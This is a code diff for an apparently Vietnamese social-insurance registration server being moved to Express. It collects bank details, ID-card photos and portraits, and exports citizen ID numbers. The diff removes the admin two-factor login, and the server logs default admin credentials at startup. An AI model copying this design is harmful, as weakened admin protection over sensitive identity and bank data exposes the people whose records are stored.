+  res.json({ ok: true, message: 'Đã cập nhật' });
+});
 
-    // Tạo pre-auth token tạm thời (chờ xác thực 2FA)
-    const preAuthToken = crypto.randomBytes(32).toString('hex');
-    const sessions = readJson(SESSIONS_FILE, {});
-    sessions[preAuthToken] = {
-      principalId: 'admin',
-      role: 'admin',
-      pendingTwoFactor: true,
-      createdAt: nowIso(),
-      expiresAt: new Date(Date.now() + PRE_AUTH_TTL_MS).toISOString()
-    };
-    writeJson(SESSIONS_FILE, sessions);
+app.post('/api/ke-khai', requireUser, upload.fields([{ name: 'portrait' }, { name: 'frontDoc' }, { name: 'backDoc' }]), async (req, res) => {
+  const { bankOwner, bankAccount, bankName, transactionPlace, submissionMethod } = req.body;
+  if (!bankOwner || !bankAccount || !bankName) return res.status(400).json({ error: 'Thiếu thông tin ngân hàng' });
 
-    const totpConfig = readTotpConfig();
+  const pUrl = req.files['portrait'] ? '/uploads/' + req.files['portrait'][0].filename : null;
+  const fUrl = req.files['frontDoc'] ? '/uploads/' + req.files['frontDoc'][0].filename : null;
+  const bUrl = req.files['backDoc'] ? '/uploads/' + req.files['backDoc'][0].filename : null;
 
-    if (!totpConfig || !totpConfig.verified) {
-      // Lần đầu: sinh secret + emergency code, hiện QR để admin quét
-      const secret = generateTotpSecret();
-      const emergencyCode = crypto.randomBytes(12).toString('hex').toUpperCase();
-      const emergencyHash = crypto.createHash('sha256').update(emergencyCode).digest('hex');
+  const id = crypto.randomUUID();
+  const u = req.principal.user;
+  
+  await db.run(`
+    INSERT INTO declarations (
+      id, userId, userPhone, userName, bankOwner, bankAccount, bankName, transactionPlace, submissionMethod,
+      portraitUrl, frontDocUrl, backDocUrl, createdAt
+    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `, [
+    id, u.id, u.phone, u.fullName, bankOwner, bankAccount, bankName, transactionPlace, submissionMethod,
+    pUrl, fUrl, bUrl, nowIso()
+  ]);
 
-      // Lưu tạm (chưa verified)
-      writeTotpConfig({
-        secret,
-        verified: false,
-        emergencyHash,
-        setupAt: null
-      });
+  res.json({ ok: true });
+});
 
-      const qrCodeUrl = await generateQrCodeUrl(secret);
-      return sendJson(res, 200, {
-        requireSetup: true,
-        qrCodeUrl,
-        secret,
-        emergencyCode, // Chỉ hiện 1 lần duy nhất này!
-        preAuthToken
-      });
-    }
+app.get('/api/admin/ke-khai', requireAdmin, async (req, res) => {
+  const decls = await db.all('SELECT * FROM declarations');
+  res.json({ ok: true, declarations: decls });
+});
 
-    // 2FA đã được cài đặt: yêu cầu nhập mã TOTP
-    return sendJson(res, 200, { require2FA: true, preAuthToken });
-  }
+app.get('/api/admin/export.xls', requireAdmin, async (req, res) => {
+  const users = await db.all('SELECT * FROM users');
+  const workbook = new exceljs.Workbook();
+  const worksheet = workbook.addWorksheet('Danh sach dang ky');
+  
+  worksheet.columns = [
+    { header: 'STT', key: 'stt', width: 5 },
+    { header: 'Loại BH', key: 'insuranceType', width: 15 },
+    { header: 'Mã NV/SV', key: 'employeeId', width: 15 },
+    { header: 'Họ và tên', key: 'fullName', width: 25 },
+    { header: 'Email', key: 'email', width: 25 },
+    { header: 'Số điện thoại', key: 'phone', width: 15 },
+    { header: 'Mã số BHXH', key: 'insuranceCode', width: 15 },
+    { header: 'Số CCCD/CMND', key: 'citizenId', width: 15 },
+    { header: 'Ngày đăng ký', key: 'createdAt', width: 20 },
+  ];
 
-  if (req.method === 'POST' && pathname === '/api/admin/verify-2fa') {
-    const body = await readBody(req);
-    const totp = String(body.totp || '').trim();
-    const preAuthToken = String(body.preAuthToken || '').trim();
-    const confirmSetup = !!body.confirmSetup;
+  users.forEach((u, i) => {
+    worksheet.addRow({
+      stt: i + 1,
+      insuranceType: u.insuranceType,
+      employeeId: u.employeeId,
+      fullName: u.fullName,
+      email: u.email,
+      phone: u.phone,
+      insuranceCode: u.insuranceCode,
+      citizenId: u.citizenId,
+      createdAt: u.createdAt
+    });
+  });
 
-    // Kiểm tra pre-auth token
-    const sessions = readJson(SESSIONS_FILE, {});
-    const preAuth = sessions[preAuthToken];
-    if (!preAuth || !preAuth.pendingTwoFactor || new Date(preAuth.expiresAt).getTime() <= Date.now()) {
-      return sendError(res, 401, 'Phiên xác thực hết hạn, vui lòng đăng nhập lại');
-    }
+  res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
+  res.setHeader('Content-Disposition', 'attachment; filename="danh-sach-dang-ky.xlsx"');
+  await workbook.xlsx.write(res);
+  res.end();
+});
 
-    const totpConfig = readTotpConfig();
-    if (!totpConfig || !totpConfig.secret) {
-      return sendError(res, 500, 'Lỗi cấu hình 2FA');
-    }
-
-    const isValid = verifyTotp(totp, totpConfig.secret);
-    if (!isValid) {
-      return sendError(res, 401, 'Mã xác thực không đúng hoặc đã hết hạn');
-    }
-
-    // Nếu là lần setup đầu tiên: đánh dấu verified
-    if (confirmSetup && !totpConfig.verified) {
-      writeTotpConfig({ ...totpConfig, verified: true, setupAt: nowIso() });
-    }
-
-    // Xóa pre-auth token và tạo session thật
-    delete sessions[preAuthToken];
-    writeJson(SESSIONS_FILE, sessions);
-    createSession(res, 'admin', 'admin');
-    return sendJson(res, 200, { user: { username: ADMIN_USERNAME, role: 'admin' } });
-  }
-
-  if (req.method === 'POST' && pathname === '/api/admin/reset-2fa') {
-    const body = await readBody(req);
-    const emergencyCode = String(body.emergencyCode || '').trim().toUpperCase();
-    const username = String(body.username || '').trim();
-    const password = String(body.password || '');
-
-    // Phải xác thực mật khẩu trước
-    if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
-      return sendError(res, 401, 'Tài khoản hoặc mật khẩu không chính xác');
-    }
-
-    const totpConfig = readTotpConfig();
-    if (!totpConfig || !totpConfig.emergencyHash) {
-      return sendError(res, 400, '2FA chưa được cài đặt');
-    }
-
-    const inputHash = crypto.createHash('sha256').update(emergencyCode).digest('hex');
-    if (inputHash !== totpConfig.emergencyHash) {
-      return sendError(res, 401, 'Mã khẩn cấp không đúng');
-    }
-
-    // Xóa 2FA để admin quét lại QR trong lần đăng nhập tiếp theo
-    fs.unlinkSync(TOTP_FILE);
-    return sendJson(res, 200, { ok: true, message: '2FA đã được reset. Vui lòng đăng nhập lại để cài đặt mã QR mới.' });
-  }
-
-  if (req.method === 'POST' && pathname === '/api/login') {
-    const body = await readBody(req);
-    const rawIdentifier = String(body.email || body.username || body.identifier || '').trim();
-    const identifier = normalizeEmail(rawIdentifier);
-    const password = String(body.password || '');
-
-    const users = readJson(USERS_FILE, []);
-    const user = users.find((item) => item.email === identifier || item.insuranceCode === rawIdentifier);
-    const validPassword = user && (
-      verifyPassword(password, user) ||
-      (user.insuranceCode === rawIdentifier && user.citizenId === password)
-    );
-    if (!user || !validPassword) return sendError(res, 401, 'Thông tin đăng nhập không đúng');
-
-    user.lastLoginAt = nowIso();
-    writeJson(USERS_FILE, users);
-    createSession(res, user.id, 'user');
-    return sendJson(res, 200, { user: safeUser(user) });
-  }
-
-  if (req.method === 'GET' && pathname === '/api/admin/stats') {
-    if (!requireAdmin(req, res)) return;
-    const users = readJson(USERS_FILE, []);
-    return sendJson(res, 200, { stats: getStats(users) });
-  }
-
-  if (req.method === 'GET' && pathname === '/api/admin/users') {
-    if (!requireAdmin(req, res)) return;
-    const users = readJson(USERS_FILE, []);
-    return sendJson(res, 200, { users: users.map(safeUser) });
-  }
-
-  if (req.method === 'DELETE' && pathname.startsWith('/api/admin/users/')) {
-    if (!requireAdmin(req, res)) return;
-    const userId = pathname.slice('/api/admin/users/'.length);
-    const users = readJson(USERS_FILE, []);
-    const userIndex = users.findIndex((user) => user.id === userId);
-    if (userIndex === -1) return sendError(res, 404, 'Không tìm thấy người dùng');
-
-    const [deletedUser] = users.splice(userIndex, 1);
-    writeJson(USERS_FILE, users);
-
-    const sessions = readJson(SESSIONS_FILE, {});
-    let changedSessions = false;
-    for (const [sessionId, session] of Object.entries(sessions)) {
-      if (session.principalId === deletedUser.id) {
-        delete sessions[sessionId];
-        changedSessions = true;
-      }
-    }
-    if (changedSessions) writeJson(SESSIONS_FILE, sessions);
-
-    return sendJson(res, 200, { ok: true, deletedUser: safeUser(deletedUser) });
-  }
-
-  if (req.method === 'POST' && pathname.startsWith('/api/admin/users/') && pathname.endsWith('/qr')) {
-    if (!requireAdmin(req, res)) return;
-    const parts = pathname.split('/');
-    // Path: /api/admin/users/:id/qr
-    const userId = parts[4];
-    let body;
-    try { body = await readBody(req); } catch { return sendError(res, 400, 'Invalid JSON'); }
-    
-    const users = readJson(USERS_FILE, []);
-    const userIndex = users.findIndex((u) => u.id === userId);
-    if (userIndex === -1) return sendError(res, 404, 'Không tìm thấy người dùng');
-
-    users[userIndex].customQrConfig = body;
-    writeJson(USERS_FILE, users);
-
-    return sendJson(res, 200, { ok: true, message: 'Đã cập nhật cấu hình QR thành công', user: safeUser(users[userIndex]) });
-  }
-
-  if (req.method === 'GET' && pathname === '/api/admin/export.xls') {
-    if (!requireAdmin(req, res)) return;
-    const users = readJson(USERS_FILE, []);
-    return exportUsersXls(res, users);
-  }
-
-  if (req.method === 'POST' && pathname === '/api/appointments') {
-    let body;
-    try { body = await readBody(req); } catch { return sendError(res, 400, 'Invalid JSON'); }
-    if (!body || !body.time) return sendError(res, 400, 'Thiếu thời gian đặt lịch');
-    const appointments = readJson(APPOINTMENTS_FILE, []);
-    const newAppointment = {
-      id: crypto.randomUUID(),
-      time: body.time,
-      note: body.note || '',
-      status: 'pending',
-      createdAt: nowIso()
-    };
-    appointments.push(newAppointment);
-    writeJson(APPOINTMENTS_FILE, appointments);
-    return sendJson(res, 200, { ok: true, appointment: newAppointment });
-  }
-
-  if (req.method === 'POST' && pathname === '/api/ke-khai') {
-    const principal = getCurrentPrincipal(req);
-    if (!principal) return sendError(res, 401, 'Vui lòng đăng nhập để kê khai');
-    let body;
-    try { body = await readBody(req); } catch { return sendError(res, 400, 'Invalid JSON'); }
-    if (!body || !body.bankOwner || !body.bankAccount || !body.bankName) return sendError(res, 400, 'Thiếu thông tin bắt buộc');
-    
-    const declarations = readJson(DECLARATIONS_FILE, []);
-    const newDeclaration = {
-      id: crypto.randomUUID(),
-      userId: principal.user.id,
-      userPhone: principal.user.phone,
-      userName: principal.user.name,
-      bankOwner: body.bankOwner,
-      bankAccount: body.bankAccount,
-      bankName: body.bankName,
-      transactionPlace: body.transactionPlace,
-      submissionMethod: body.submissionMethod,
-      images: body.images || {},
-      createdAt: nowIso()
-    };
-    declarations.push(newDeclaration);
-    writeJson(DECLARATIONS_FILE, declarations);
-    return sendJson(res, 200, { ok: true, declaration: newDeclaration });
-  }
-
-  if (req.method === 'GET' && pathname === '/api/admin/ke-khai') {
-    if (!requireAdmin(req, res)) return;
-    const declarations = readJson(DECLARATIONS_FILE, []);
-    return sendJson(res, 200, { ok: true, declarations });
-  }
-
-  if (req.method === 'GET' && pathname === '/api/admin/appointments') {
-    if (!requireAdmin(req, res)) return;
-    const appointments = readJson(APPOINTMENTS_FILE, []);
-    return sendJson(res, 200, { ok: true, appointments });
-  }
-
-  if (req.method === 'POST' && pathname.startsWith('/api/admin/appointments/') && pathname.endsWith('/status')) {
-    if (!requireAdmin(req, res)) return;
-    const id = pathname.split('/')[4];
-    let body;
-    try { body = await readBody(req); } catch { return sendError(res, 400, 'Invalid JSON'); }
-    if (!body || !body.status) return sendError(res, 400, 'Thiếu trạng thái');
-    const appointments = readJson(APPOINTMENTS_FILE, []);
-    const index = appointments.findIndex(a => a.id === id);
-    if (index === -1) return sendError(res, 404, 'Không tìm thấy đơn đặt lịch');
-    appointments[index].status = body.status;
-    writeJson(APPOINTMENTS_FILE, appointments);
-    return sendJson(res, 200, { ok: true, appointment: appointments[index] });
-  }
-
-  if (req.method === 'GET' && pathname === '/api/vietqr/config') {
-    const config = readJson(VIETQR_CONFIG_FILE, {});
-    return sendJson(res, 200, { ok: true, config });
-  }
-
-  if (req.method === 'POST' && pathname === '/api/admin/vietqr/config') {
-    if (!requireAdmin(req, res)) return;
-    let body;
-    try { body = await readBody(req); } catch { return sendError(res, 400, 'Invalid JSON'); }
-    writeJson(VIETQR_CONFIG_FILE, body);
-    return sendJson(res, 200, { ok: true, message: 'Đã cập nhật cấu hình VietQR' });
-  }
-
-  return sendError(res, 404, 'Không tìm thấy API');
-}
-
-function serveStatic(req, res, pathname) {
+// Static routes using Express
+app.use((req, res, next) => {
   const host = req.headers.host || '';
   const isHostAdmin = host.startsWith('admin.') || host.includes('localhost') || host.includes('127.0.0.1');
 
-  if (host.startsWith('admin.') && pathname === '/') {
-    pathname = '/admin-login.html';
+  if (host.startsWith('admin.') && req.path === '/') {
+    return res.sendFile(path.join(PUBLIC_DIR, 'admin-login.html'));
   }
-
-  let filePath = pathname === '/' ? path.join(PUBLIC_DIR, 'index.html') : path.join(PUBLIC_DIR, pathname);
   
-  if (pathname === '/admin' || pathname === '/admin.html') {
-    if (!isHostAdmin) {
-      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
-      return res.end('Forbidden: Vui lòng truy cập thông qua tên miền quản trị.');
-    }
-    filePath = path.join(PUBLIC_DIR, 'admin.html');
+  if (req.path === '/admin' || req.path === '/admin.html') {
+    if (!isHostAdmin) return res.status(403).send('Forbidden: Vui lòng truy cập thông qua tên miền quản trị.');
+    return res.sendFile(path.join(PUBLIC_DIR, 'admin.html'));
   }
 
-  if (pathname === '/chon-dang-ky') filePath = path.join(PUBLIC_DIR, 'chon-dang-ky.html');
-  if (pathname === '/dang-ky') filePath = path.join(PUBLIC_DIR, 'dang-ky.html');
+  if (req.path === '/chon-dang-ky') return res.sendFile(path.join(PUBLIC_DIR, 'chon-dang-ky.html'));
+  if (req.path === '/dang-ky') return res.sendFile(path.join(PUBLIC_DIR, 'dang-ky.html'));
 
-  const resolved = path.resolve(filePath);
-  if (!resolved.startsWith(PUBLIC_DIR)) {
-    res.writeHead(403);
-    return res.end('Forbidden');
-  }
+  next();
+});
 
-  fs.readFile(resolved, (error, data) => {
-    if (error) {
-      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
-      return res.end('Not found');
-    }
-    const ext = path.extname(resolved).toLowerCase();
-    res.writeHead(200, { 'Content-Type': contentTypes[ext] || 'application/octet-stream' });
-    res.end(data);
+app.use(express.static(PUBLIC_DIR));
+
+app.use((req, res) => {
+  res.status(404).sendFile(path.join(PUBLIC_DIR, 'index.html'));
+});
+
+initDB().then(() => {
+  app.listen(PORT, () => {
+    console.log(`Server Express dang chay tai http://localhost:${PORT}`);
+    console.log(`Admin mac dinh: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
   });
-}
-
-const server = http.createServer(async (req, res) => {
-  try {
-    const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
-    const pathname = decodeURIComponent(parsedUrl.pathname);
-    if (pathname.startsWith('/api/')) return await handleApi(req, res, pathname);
-    return serveStatic(req, res, pathname);
-  } catch (error) {
-    console.error(error);
-    return sendError(res, 500, 'Lỗi server');
-  }
-});
-
-ensureStore();
-server.listen(PORT, () => {
-  console.log(`Server dang chay tai http://localhost:${PORT}`);
-  console.log(`Admin mac dinh: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
-});
+}).catch(console.error);
